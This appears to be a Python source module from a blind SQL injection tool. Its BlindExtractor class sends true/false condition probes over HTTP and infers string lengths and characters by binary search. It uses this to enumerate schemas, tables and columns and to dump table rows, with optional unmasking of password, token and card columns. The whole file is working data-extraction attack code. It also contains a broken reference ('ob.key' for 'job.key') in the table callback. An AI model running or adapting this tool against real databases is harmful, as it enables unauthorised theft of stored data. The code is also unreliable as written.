from __future__ import annotations

import threading
import time
from collections.abc import Callable, Sequence
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import TypeVar

from .client import HttpClient
from .dialects import SqlDialect
from .events import EventCallback, EventEmitter, ScanControl, entity_id, relationship_id
from .models import DatabaseMap, ExtractionJob, ProbeResult, Schema, Table
from .oracle import ResponseOracle


T = TypeVar("T")
R = TypeVar("R")


_SENSITIVE_COLUMN_PARTS = {
    "password",
    "passwd",
    "pwd",
    "secret",
    "token",
    "api_key",
    "apikey",
    "session",
    "cookie",
    "authorization",
    "auth",
    "credit_card",
    "card_number",
    "cvv",
    "cvc",
}


def protect_sensitive_value(column: str, value: str, *, reveal: bool = False) -> str:
    if reveal:
        return value
    normalized = column.casefold().replace("-", "_").replace(" ", "_")
    if not any(part in normalized for part in _SENSITIVE_COLUMN_PARTS):
        return value
    if any(part in normalized for part in {"card", "cvv", "cvc"}):
        return "****" + value[-4:] if len(value) > 4 else "****"
    if any(part in normalized for part in {"token", "session", "api", "auth"}):
        return f"{value[:4]}…{value[-4:]}" if len(value) >= 12 else "********"
    return "********"


class CalibrationError(RuntimeError):
    pass


class ExtractionError(RuntimeError):
    pass


@dataclass(slots=True)
class ExtractorConfig:
    workers: int = 4
    max_length: int = 128
    max_items: int = 128
    min_char_code: int = 32
    max_char_code: int = 126

    def __post_init__(self) -> None:
        if not 1 <= self.workers <= 16:
            raise ValueError("workers must be between 1 and 16")
        if self.max_length < 1:
            raise ValueError("max_length must be at least 1")
        if self.max_items < 1:
            raise ValueError("max_items must be at least 1")
        if not 0 <= self.min_char_code <= self.max_char_code <= 0x10FFFF:
            raise ValueError("invalid character code range")


class BlindExtractor:
    def __init__(
        self,
        client: HttpClient,
        oracle: ResponseOracle,
        dialect: SqlDialect,
        config: ExtractorConfig,
        *,
        scan_id: str = "cli",
        event_callback: EventCallback | None = None,
        control: ScanControl | None = None,
    ) -> None:
        self.client = client
        self.oracle = oracle
        self.dialect = dialect
        self.config = config
        self.control = control or ScanControl()
        self.events = EventEmitter(scan_id, event_callback)
        self._started = time.monotonic()
        self._event_lock = threading.Lock()

    def _emit(self, event_type: str, **payload: object) -> None:
        with self._event_lock:
            self.events.emit(event_type, **payload)

    def _emit_entity(
        self,
        *,
        kind: str,
        name: str,
        entity_key: tuple[str, ...],
        parent_id: str | None = None,
        status: str = "complete",
        data: dict[str, object] | None = None,
    ) -> str:
        identifier = entity_id(kind, *entity_key)
        self._emit(
            f"{kind}.discovered",
            entity={
                "id": identifier,
                "type": kind,
                "name": name,
                "parent_id": parent_id,
                "status": status,
                "data": data or {},
            },
        )
        if parent_id is not None:
            relation = relationship_id(parent_id, identifier, "contains")
            self._emit(
                "relationship.created",
                relationship={
                    "id": relation,
                    "source_id": parent_id,
                    "target_id": identifier,
                    "kind": "contains",
                },
            )
        return identifier

    def probe_condition(self, condition: str) -> ProbeResult:
        self.control.checkpoint()
        payload = self.dialect.boolean_payload(condition)
        started = time.monotonic()
        response = self.client.get(payload)
        elapsed = time.monotonic() - started
        result = ProbeResult(
            matched=self.oracle.evaluate(response),
            status_code=response.status_code,
            body_length=len(response.content),
            elapsed_seconds=elapsed,
            final_url=response.url,
        )
        self._emit(
            "request.completed",
            matched=result.matched,
            status_code=result.status_code,
            body_length=result.body_length,
            elapsed_seconds=round(result.elapsed_seconds, 6),
            requests_used=self.client.requests_used,
        )
        return result

    def calibrate(self) -> tuple[ProbeResult, ProbeResult]:
        true_result = self.probe_condition("1=1")
        false_result = self.probe_condition("1=0")
        if not true_result.matched or false_result.matched:
            raise CalibrationError(
                "Oracle calibration failed. Expected TRUE to match and FALSE not to match. "
                f"TRUE(status={true_result.status_code}, bytes={true_result.body_length}, "
                f"matched={true_result.matched}); "
                f"FALSE(status={false_result.status_code}, bytes={false_result.body_length}, "
                f"matched={false_result.matched})."
            )
        self._emit(
            "scan.calibrated",
            true_status=true_result.status_code,
            true_bytes=true_result.body_length,
            false_status=false_result.status_code,
            false_bytes=false_result.body_length,
        )
        return true_result, false_result

    def infer_integer(self, expression: str, maximum: int) -> int:
        value, truncated = self.infer_integer_capped(expression, maximum)
        if truncated:
            raise ExtractionError(
                f"Inferred integer exceeds configured maximum ({maximum})."
            )
        return value

    def infer_integer_capped(self, expression: str, maximum: int) -> tuple[int, bool]:
        if maximum < 0:
            raise ValueError("maximum cannot be negative")
        if self.probe_condition(f"COALESCE(({expression}), 0) > {maximum}").matched:
            return maximum, True
        low, high = 0, maximum
        while low < high:
            midpoint = (low + high) // 2
            if self.probe_condition(
                f"COALESCE(({expression}), 0) > {midpoint}"
            ).matched:
                low = midpoint + 1
            else:
                high = midpoint
        return low, False

    def extract_string(self, expression: str, *, maximum_length: int | None = None) -> str:
        limit = maximum_length or self.config.max_length
        length, truncated = self.infer_integer_capped(
            self.dialect.length_expression(expression), limit
        )
        characters: list[str] = []
        for position in range(1, length + 1):
            self.control.checkpoint()
            code_expression = self.dialect.char_code_expression(expression, position)
            low = self.config.min_char_code
            high = self.config.max_char_code
            if self.probe_condition(f"({code_expression}) < {low}").matched:
                raise ExtractionError(
                    f"Character at position {position} is below --min-char-code ({low})."
                    )
            if self.probe_condition(f"({code_expression}) > {high}").matched:
                raise ExtractionError(
                    f"Character at position {position} exceeds --max-char-code ({high})."
                )
            while low < high:
                midpoint = (low + high) // 2
                if self.probe_condition(
                    f"({code_expression}) > {midpoint}"
                ).matched:
                    low = midpoint + 1
                else:
                    high = midpoint
            if not self.probe_condition(f"({code_expression}) = {low}").matched:
                raise ExtractionError(
                    f"Unable to confirm character at position {position}."
                )
            characters.append(chr(low))
        value = "".join(characters)
        return value + ("…" if truncated else "")

    def _parallel_map(
        self,
        items: Sequence[T],
        function: Callable[[T], R],
        on_result: Callable[[T, R], None] | None = None,
    ) -> list[R]:
        if not items:
            return []
        workers = min(self.config.workers, len(items))
        values: list[R | None] = [None] * len(items)
        with ThreadPoolExecutor(
            max_workers=workers, thread_name_prefix="sqliblind"
        ) as executor:
            futures: dict[Future[R], tuple[int, T]] = {
                executor.submit(function, item): (index, item)
                for index, item in enumerate(items)
            }
            try:
                for future in as_completed(futures):
                    index, item = futures[future]
                    result = future.result()
                    values[index] = result
                    if on_result is not None:
                        on_result(item, result)
            except Exception:
                for future in futures:
                    future.cancel()
                raise
        return [value for value in values if value is not None]

    def extract_many(
        self,
        jobs: list[ExtractionJob],
        *,
        maximum_length: int | None = None,
        on_result: Callable[[ExtractionJob, str], None] | None = None,
    ) -> dict[str, str]:
        if maximum_length is None:
            function = lambda job: self.extract_string(job.expression)
        else:
            function = lambda job: self.extract_string(
                job.expression, maximum_length=maximum_length
            )
        values = self._parallel_map(
            jobs,
            function,
            on_result=on_result,
        )
        return {job.key: value for job, value in zip(jobs, values, strict=True)}

    def enumerate_schemas(self) -> list[str]:
        self._emit("phase.started", phase="schemas")
        count = self.infer_integer(
            self.dialect.schema_count_expression(), self.config.max_items
        )
        jobs = [
            ExtractionJob(str(index), self.dialect.schema_name_expression(index))
            for index in range(count)
        ]
        values = self.extract_many(
            jobs,
            on_result=lambda _job, name: self._emit_entity(
                kind="schema", name=name, entity_key=(name,), data={"schema": name}
            ),
        )
        self._emit("phase.completed", phase="schemas", count=len(values))
        return list(values.values())

    def enumerate_tables(self, schema: str) -> list[str]:
        schema_identifier = entity_id("schema", schema)
        count = self.infer_integer(
            self.dialect.table_count_expression(schema), self.config.max_items
        )
        jobs = [
            ExtractionJob(
                str(index), self.dialect.table_name_expression(schema, index)
            )
            for index in range(count)
        ]
        values = self.extract_many(
            jobs,
            on_result=lambda _job, name: self._emit_entity(
                kind="table",
                name=name,
                entity_key=(schema, name),
                parent_id=schema_identifier,
                data={"schema": schema, "table": name},
            ),
        )
        return list(values.values())

    def enumerate_columns(self, schema: str, table: str) -> list[str]:
        table_identifier = entity_id("table", schema, table)
        count = self.infer_integer(
            self.dialect.column_count_expression(schema, table), self.config.max_items
        )
        jobs = [
            ExtractionJob(
                str(index),
                self.dialect.column_name_expression(schema, table, index),
            )
            for index in range(count)
        ]
        values = self.extract_many(
            jobs,
            on_result=lambda _job, name: self._emit_entity(
                kind="column",
                name=name,
                entity_key=(schema, table, name),
                parent_id=table_identifier,
                data={"schema": schema, "table": table, "column": name},
            ),
        )
        return list(values.values())

    def extract_table_rows(
        self,
        schema: str,
        table: Table,
        *,
        max_rows: int,
        max_columns: int,
        max_value_length: int,
        max_data_bytes: int,
        reveal_sensitive_values: bool = False,
    ) -> tuple[int, bool, int]:
        if not table.columns:
            return 0, False, 0
        selected_columns = table.columns[:max_columns]
        count, truncated = self.infer_integer_capped(
            self.dialect.row_count_expression(schema, table.name), max_rows
        )
        bytes_used = 0
        table_identifier = entity_id("table", schema, table.name)
        for row_index in range(count):
            self.control.checkpoint()
            row_identifier = self._emit_entity(
                kind="row",
                name=f"row {row_index + 1}",
                entity_key=(schema, table.name, str(row_index)),
                parent_id=table_identifier,
                status="discovering",
                data={
                    "schema": schema,
                    "table": table.name,
                    "row_index": row_index,
                },
            )
            row_values: dict[str, str] = {}
            row_truncated = False
            for column in selected_columns:
                remaining = max_data_bytes - bytes_used
                if remaining <= 0:
                    truncated = True
                    row_truncated = True
                    break
                expression = self.dialect.cell_value_expression(
                    schema,
                    table.name,
                    column,
                    row_index,
                    selected_columns[0],
                )
                value = self.extract_string(
                    expression, maximum_length=min(max_value_length, remaining)
                )
                encoded = value.encode("utf-8")
                if len(encoded) > remaining:
                    value = encoded[:remaining].decode("utf-8", errors="ignore")
                    encoded = value.encode("utf-8")
                    truncated = True
                    row_truncated = True
                if value.endswith("…"):
                    truncated = True
                    row_truncated = True
                bytes_used += len(encoded)
                display_value = protect_sensitive_value(
                    column, value, reveal=reveal_sensitive_values
                )
                row_values[column] = display_value
                self._emit_entity(
                    kind="cell",
                    name=column,
                    entity_key=(schema, table.name, str(row_index), column),
                    parent_id=row_identifier,
                    status="partial" if row_truncated else "complete",
                    data={
                        "schema": schema,
                        "table": table.name,
                        "column": column,
                        "row_index": row_index,
                        "value": display_value,
                        "redacted": display_value != value,
                    },
                )
                if bytes_used >= max_data_bytes:
                    truncated = True
                    row_truncated = True
                    break
            if row_values:
                table.rows.append(row_values)
            self._emit(
                "entity.updated",
                entity={
                    "id": row_identifier,
                    "type": "row",
                    "name": f"row {row_index + 1}",
                    "parent_id": table_identifier,
                    "status": "partial" if row_truncated else "complete",
                    "data": {
                        "schema": schema,
                        "table": table.name,
                        "row_index": row_index,
                        "values": row_values,
                    },
                },
            )
            if row_truncated:
                self._emit(
                    "data.truncated",
                    schema=schema,
                    table=table.name,
                    reason="data_limit",
                    maximum_bytes=max_data_bytes,
                    maximum_value_length=max_value_length,
                )
                break
        return len(table.rows), truncated, bytes_used

    def build_database_map(
        self,
        *,
        include_columns: bool = True,
        include_data: bool = False,
        data_tables: set[str] | None = None,
        max_rows: int = 5,
        max_data_columns: int = 10,
        max_value_length: int = 128,
        max_data_bytes: int = 10_000,
        reveal_sensitive_values: bool = False,
    ) -> DatabaseMap:
        """Build schema → table → column → row/cell relationships."""

        schema_names = self.enumerate_schemas()
        database = DatabaseMap([Schema(name) for name in schema_names])
        table_counts = self._parallel_map(
            schema_names,
            lambda schema: self.infer_integer(
                self.dialect.table_count_expression(schema), self.config.max_items
            ),
        )

        table_jobs: list[ExtractionJob] = []
        table_locations: list[tuple[int, int]] = []
        for schema_index, (schema_name, count) in enumerate(
            zip(schema_names, table_counts, strict=True)
        ):
            for table_index in range(count):
                table_jobs.append(
                    ExtractionJob(
                        f"s{schema_index}:t{table_index}",
                        self.dialect.table_name_expression(schema_name, table_index),
                    )
                )
                table_locations.append((schema_index, table_index))

        table_location_by_key = {
            job.key: location
            for job, location in zip(table_jobs, table_locations, strict=True)
        }

        def on_table(job: ExtractionJob, table_name: str) -> None:
            location = table_location_by_key[ob.key]
            schema_name = schema_names[location[0]]
            self._emit_entity(
                kind="table",
                name=table_name,
                entity_key=(schema_name, table_name),
                parent_id=entity_id("schema", schema_name),
                data={"schema": schema_name, "table": table_name},
            )

        table_names = list(
            self.extract_many(table_jobs, on_result=on_table).values()
        )
        for (schema_index, _), table_name in zip(
            table_locations, table_names, strict=True
        ):
            database.schemas[schema_index].add_table(Table(table_name))

        if not include_columns:
            return database

        table_references: list[tuple[int, int, str, str]] = []
        for schema_index, schema in enumerate(database.schemas):
            for table_index, table in enumerate(schema.tables):
                table_references.append(
                    (schema_index, table_index, schema.name, table.name)
                )

        column_counts = self._parallel_map(
            table_references,
            lambda item: self.infer_integer(
                self.dialect.column_count_expression(item[2], item[3]),
                self.config.max_items,
            ),
        )
        column_jobs: list[ExtractionJob] = []
        column_locations: list[tuple[int, int, str, str]] = []
        for reference, count in zip(table_references, column_counts, strict=True):
            schema_index, table_index, schema_name, table_name = reference
            for column_index in range(count):
                column_jobs.append(
                    ExtractionJob(
                        f"s{schema_index}:t{table_index}:c{column_index}",
                        self.dialect.column_name_expression(
                            schema_name, table_name, column_index
                        ),
                    )
                )
                column_locations.append(
                    (schema_index, table_index, schema_name, table_name)
                )

        column_location_by_key = {
            job.key: location
            for job, location in zip(column_jobs, column_locations, strict=True)
        }

        def on_column(job: ExtractionJob, column_name: str) -> None:
            location = column_location_by_key[job.key]
            _, _, schema_name, table_name = location
            self._emit_entity(
                kind="column",
                name=column_name,
                entity_key=(schema_name, table_name, column_name),
                parent_id=entity_id("table", schema_name, table_name),
                data={
                    "schema": schema_name,
                    "table": table_name,
                    "column": column_name,
                },
            )

        column_names = list(
            self.extract_many(column_jobs, on_result=on_column).values()
        )
        for (schema_index, table_index, _, _), column_name in zip(
            column_locations, column_names, strict=True
        ):
            database.schemas[schema_index].tables[table_index].add_column(column_name)

        if not include_data:
            return database
        selectors = {value.casefold() for value in (data_tables or set())}
        remaining_bytes = max_data_bytes
        for schema in database.schemas:
            for table in schema.tables:
                selector = f"{schema.name}.{table.name}".casefold()
                if selector not in selectors:
                    continue
                _, _, used = self.extract_table_rows(
                    schema.name,
                    table,
                    max_rows=max_rows,
                    max_columns=max_data_columns,
                    max_value_length=max_value_length,
                    max_data_bytes=remaining_bytes,
                    reveal_sensitive_values=reveal_sensitive_values,
                )
                remaining_bytes -= used
                if remaining_bytes <= 0:
                    return database
        return database

    @property
    def elapsed_seconds(self) -> float:
        return time.monotonic() - self._started
